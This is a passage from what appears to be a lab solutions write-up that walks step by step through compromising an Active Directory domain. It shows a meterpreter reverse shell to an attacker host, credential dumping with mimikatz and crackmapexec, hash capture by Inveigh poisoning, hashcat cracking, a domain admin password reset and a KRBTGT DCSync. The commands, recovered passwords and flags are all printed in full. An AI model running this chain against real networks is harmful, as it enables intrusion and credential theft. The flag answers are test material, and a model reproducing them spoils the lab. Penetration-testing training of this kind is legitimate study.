C4ANwAuADIANAAwADoAOAAwADgAMAAvAHoAYQAxAEYAYQBQAFIAOABvACcAKQApADsA"
output                                                                             

--------------------------------------------------------------------------------   

[+] Found privilege: SeImpersonatePrivilege                                        

[+] Named pipe listening...                                                        

[+] CreateProcessAsUser() OK                                                       

NULL                   
```

When students check the terminal, they will see a `meterpreter` session verifying SYSTEM privileges:

```
[*] 172.16.7.60      web_delivery - Delivering AMSI Bypass (1375 bytes)
[*] 172.16.7.60      web_delivery - Delivering Payload (3692 bytes)
[*] Sending stage (200262 bytes) to 172.16.7.60
[*] Meterpreter session 1 opened (172.16.7.240:4444 -> 172.16.7.60:53991 ) at 2022-11-29 13:06:07 -0500

[msf](Jobs:1 Agents:1) exploit(multi/script/web_delivery) >> sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(C:\Windows\system32) > shell
Process 4076 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami

nt authority\system
```

Using the privileges of the super user, students will need to extract passwords from memory using `mimikatz.exe`, however first, it must be transferred to the jump-box:

Code: shell

```shell
cp /usr/share/mimikatz/x64/mimikatz.exe mimikatz64.exe
scp mimikatz64.exe htb-student@STMIP:/home/htb-student/Desktop
```

```
┌─[us-academy-2]─[10.10.14.69]─[htb-ac594497@htb-n7rjfuoj2q]─[~]
└──╼ [★]$ cp /usr/share/mimikatz/x64/mimikatz.exe mimikatz64.exe
┌─[us-academy-2]─[10.10.14.69]─[htb-ac594497@htb-n7rjfuoj2q]─[~]
└──╼ [★]$ scp mimikatz64.exe htb-student@10.129.207.199:/home/htb-student/Desktop

htb-student@10.129.207.199's password: 
mimikatz64.exe                                                                         100% 1279KB   2.1MB/s   00:00    
```

Then, using the meterpreter session, students can upload it to the SQL01 machine:

Code: shell

```shell
upload mimikatz64.exe
```

```
(Meterpreter 1)(C:\) > upload mimikatz64.exe

[*] uploading  : /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
[*] Uploaded 1.25 MiB of 1.25 MiB (100.0%): /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
[*] uploaded   : /home/htb-student/Desktop/mimikatz64.exe -> mimikatz64.exe
```

Now, LSA passwords can be extracted using `mimikatz's` `skeurlsa::loginpasswords`:

Code: shelll

```shelll
shell
mimikatz64.exe
privilege::debug
sekurlsa::logonpasswords
```

```
(Meterpreter 1)(C:\) > shell

Process 2608 created.
Channel 9 created.
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>mimikatz64.exe
mimikatz64.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY \`gentilkiwi\` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # privilege::debug
Privilege '20' OK

mimikatz # sekurlsa::logonpasswords

<SNIP>

Authentication Id : 0 ; 213027 (00000000:00034023)
Session           : Interactive from 1
User Name         : mssqlsvc
Domain            : INLANEFREIGHT
Logon Server      : DC01
Logon Time        : 12/12/2022 8:20:40 AM
SID               : S-1-5-21-3327542485-274640656-2609762496-4613
	msv :	
	 [00000003] Primary
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * NTLM     : 8c9555327d95f815987c0d81238c7660
	 * SHA1     : 0a8d7e8141b816c8b20b4762da5b4ee7038b515c
	 * DPAPI    : a1568414db09f65c238b7557bc3ceeb8
	tspkg :	
	wdigest :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT
	 * Password : (null)
	kerberos :	
	 * Username : mssqlsvc
	 * Domain   : INLANEFREIGHT.LOCAL
	 * Password : Sup3rS3cur3maY5ql$3rverE
```

The cleartext password for `mssqlsvc` is revealed to be `Sup3rS3cur3maY5ql$3rverE`.

Alternatively, students can run `crackmapexec` as the local administrator to find the cleartext password:

Code: shell

```shell
sudo crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --lsa
```

```
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ $sudo crackmapexec smb 172.16.7.60 -u administrator -p Welcome1 --local-auth --lsa

SMB         172.16.7.60     445    SQL01            [*] Windows 10.0 Build 17763 x64 (name:SQL01) (domain:SQL01) (signing:False) (SMBv1:False)
SMB         172.16.7.60     445    SQL01            [+] SQL01\administrator:Welcome1 (Pwn3d!)
SMB         172.16.7.60     445    SQL01            [+] Dumping LSA secrets
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT.LOCAL/Administrator:$DCC2$10240#Administrator#30376b08e0552233fba8af8e0be0fb13
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT.LOCAL/mssqlsvc:$DCC2$10240#mssqlsvc#7fd9a156f003adec1eed9c9e1165b973
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT\SQL01$:aes256-cts-hmac-sha1-96:613dcc03b3d52a10ddfc497787467a6b894766df76d3314569f25c989e3853d0
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT\SQL01$:aes128-cts-hmac-sha1-96:8f0ee56c9a5003f1f7abb72336503eb1
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT\SQL01$:des-cbc-md5:e5f1164a40c77c38
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT\SQL01$:plain_password_hex:460742dd3a79d239073f5dbd09481d23a44adbda93b910122f230cb3188249f938e8089cf26623a0fcd3b17e93492e000c27e29093c5d1b9cf7ea2de23419e1b9f8d2cbc5663f23df904e5695461bf42f07acfabceb483c2d2dfe37d80df194655ab925534b4a72ef7aa7602930aebd8b7835fe866142cbd00bf7d2b7710e1cc7fde4cd304a3fa524efea6a67e4a78abdad7b7cf9a64e32f9b414fadaab1d626db252f29a5febba4a3b8d0731eb17579be86d149352e0fb0d7334566298a73d9a6e2b2b6c088c14779b3e91a2cfaca15fb8e77146430eb4da22bba00db61081a97acb0355ea888e0b87ee3edf270a5c8
SMB         172.16.7.60     445    SQL01            INLANEFREIGHT\SQL01$:aad3b435b51404eeaad3b435b51404ee:6b33b7296ea476ffd8479416bc322a7e:::
SMB         172.16.7.60     445    SQL01            dpapi_machinekey:0x97b7061765871cd4f916f138e8188ff43830deb6
dpapi_userkey:0x0d9f2fafc12db65450e57f928bb671a1e1b3d764
SMB         172.16.7.60     445    SQL01            NL$KM:a2529d310bb71c7545d64b76412dd321c65cdd0424d307ffca5cf4e5a03894149164fac791d20e027ad65253b4f4a96f58ca7600dd39017dc5f78f4bab1edc63
SMB         172.16.7.60     445    SQL01            [+] Dumped 9 LSA secrets to /root/.cme/logs/SQL01_172.16.7.60_2022-11-29_140723.secrets and /root/.cme/logs/SQL01_172.16.7.60_2022-11-29_140723.cached
```

The hex string can be decoded to reveal the password `Sup3rS3cur3maY5ql$3rverE`.

Students need to move laterally to the next machine, authenticating to 172.16.7.50 as `mssqlsvc:Sup3rS3cur3maY5ql$3rverE`:

Code: shell

```shell
$xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE'
```

```
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $xfreerdp /v:172.16.7.50 /u:mssqlsvc /p:'Sup3rS3cur3maY5ql$3rverE'

[14:19:10:413] [4707:4708] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[14:19:10:413] [4707:4708] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[14:19:10:413] [4707:4708] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[14:19:10:413] [4707:4708] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
<SNIP>
```

At last, students can read the flag file "flag.txt", which is under `C:\Users\Administrator\Desktop\`:

![[HTB Solutions/CAPE/z. images/dd3cb15720f61c440eeebbcbf5f9034a_MD5.jpg]]

Answer: `exc3ss1ve_adm1n_r1ights!`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 9

### "Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?"

Students need to download `Inveigh.ps1` and transfer it over to MS01:

Code: shell

```shell
wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@STMIP:/home/htb-student/Desktop
```

```
┌─[us-academy-2]─[10.10.14.96]─[htb-ac330204@htb-9bwbc6vgaj]─[~]
└──╼ [★]$ wget -q https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 && scp Inveigh.ps1 htb-student@10.129.73.75:/home/htb-student/Desktop

htb-student@10.129.73.75's password: 
Inveigh.ps1                                                                            100%  296KB 779.6KB/s   00:00                 
```

Once the `Inveigh.ps1` is on the Windows host, it can be imported and invoked:

Code: powershell

```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

```
PS C:\Users\mssqlsvc\Desktop> Import-Module .\Inveigh.ps1
PS C:\Users\mssqlsvc\Desktop> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y

[*] Inveigh 1.506 started at 2022-11-29T14:24:15
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.7.50
[+] Spoofer IP Address = 172.16.7.50
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled

<SNIP>

[*] Press any key to stop console output
[+] [2022-11-29T14:24:27] TCP(445) SYN packet detected from 172.16.7.3:51009
[+] [2022-11-29T14:24:27] SMB(445) negotiation request detected from 172.16.7.3:51009
[+] [2022-11-29T14:24:27] SMB(445) NTLM challenge F8059BA109C97E0D sent to 172.16.7.3:51009
[+] [2022-11-29T14:24:27] SMB(445) NTLMv2 captured for INLANEFREIGHT\CT059 from 172.16.7.3(DC01):51009:
CT059::INLANEFREIGHT:F8059BA109C97E0D:78A41190201430E8654DE55727DF7EB5:010100000000000089A153943004D901BDD5DA8680F87B870000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080089A153943004D901060004000200000008003000300000000000000000000000002000007A0B42C80CDAF1780F6DFBD615855858C454CE6D589CE7368945318F68520DD80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
```

After waiting for a while, students will capture the hash `CT059::INLANEFREIGHT:F8059BA109C97E0D:78A41190201430E8654DE55727DF7EB5:010100000000000089A153943004D901BDD5DA8680F87B870000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000700080089A153943004D901060004000200000008003000300000000000000000000000002000007A0B42C80CDAF1780F6DFBD615855858C454CE6D589CE7368945318F68520DD80A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000` via a poisoned response for the user `CT059`.

Answer: `CT059`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 10

### "Crack this user's password hash and submit the cleartext password as your answer."

Students need to crack the user's password using `Hashcat` utilizing hashmode 5600, to find the cleartext to be `charlie1`:

Code: shell

```shell
hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt 
```

```
$ hashcat -m 5600 CT059_hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

<SNIP>

CT059::INLANEFREIGHT:1f36b2281ab74fb6:57920a050e98f738a02b4cc9e8d3999e:01010000000000006aedd4903558d801a1ae95c7d4aefe1b0000000002001a0049004e004c0041004e0045004600520045004900470048005400010008004d005300300031000400260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00030030004d005300300031002e0049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c000500260049004e004c0041004e00450046005200450049004700480054002e004c004f00430041004c00070008006aedd4903558d80106000400020000000800300030000000000000000000000000200000dd9dc6dae2b5fe8ff3572953b532f894c0d82985b47fafe105a3f8c1342f89190a001000000000000000000000000000000000000900200063006900660073002f003100370032002e00310036002e0037002e0035003000000000000000000000000000:charlie1

<SNIP>
```

Answer: `charlie1`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 11

### "Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host."

Students need to authenticate as `CT059:charlie1` to 172.16.7.50:

Code: shell

```shell
xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1
```

```
┌─[✗]─[htb-student@skills-par01]─[~/Desktop]
└──╼ $xfreerdp /v:172.16.7.50 /u:CT059 /p:charlie1

[15:39:52:533] [2333:2334] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[15:39:52:533] [2333:2334] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[15:39:52:533] [2333:2334] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
<SNIP>
```

Now, students must refer to the `Bloodhound` data to identify the final phase of the attack chain. The CT059 user has `GenericAll` rights over the Domain Admins group:

![[HTB Solutions/CAPE/z. images/68e129d98cdded942048b7c0a18451f7_MD5.jpg]]

`Bloodhound` also provides instructions on how to abuse this misconfiguration using `PowerView` `cmdlets`:

![[HTB Solutions/CAPE/z. images/70d0ebeefe10d963e5116933840b5a6f_MD5.jpg]]

Using these steps, students can add the `CT059` user to the domain administrators group:

Code: powershell

```powershell
net user administrator Welcome1 /domain
```

```
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\CT059> net user Administrator Welcome1 /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

The command completed successfully.
```

Now, students have the password for Domain Administrator; thereafter, students can obtain the flag using a number of ways, `wmiexec.py` will be used to connect to DC01 and print out the flag file:

Code: shell

```shell
wmiexec.py administrator@172.16.7.3
type C:\Users\administrator\desktop\flag.txt
```

```
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $wmiexec.py administrator@172.16.7.3

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands

C:\>type C:\Users\administrator\desktop\flag.txt

acLs_f0r_th3_w1n!
```

Answer: `acLs_f0r_th3_w1n!`

# AD Enumeration & Attacks - Skills Assessment Part II

## Question 12

### "Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise."

Students need to `DCSync` the KRBTGT NTLM hash with `secretsdump.py`, finding it to be `7eba70412d81c1cd030d72a3e8dbe05f`:

```shell
secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT
```
```
┌─[htb-student@skills-par01]─[~/Desktop]
└──╼ $secretsdump.py administrator@172.16.7.3 -just-dc-user KRBTGT

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f:::
[*] Kerberos keys grabbed
krbtgt:aes256-cts-hmac-sha1-96:b043a263ca018cee4abe757dea38e2cee7a42cc56ccb467c0639663202ddba91
krbtgt:aes128-cts-hmac-sha1-96:e1fe1e9e782036060fb7cbac23c87f9d
krbtgt:des-cbc-md5:e0a7fbc176c28a37
[*] Cleaning up... 
```

Answer: `7eba70412d81c1cd030d72a3e8dbe05f`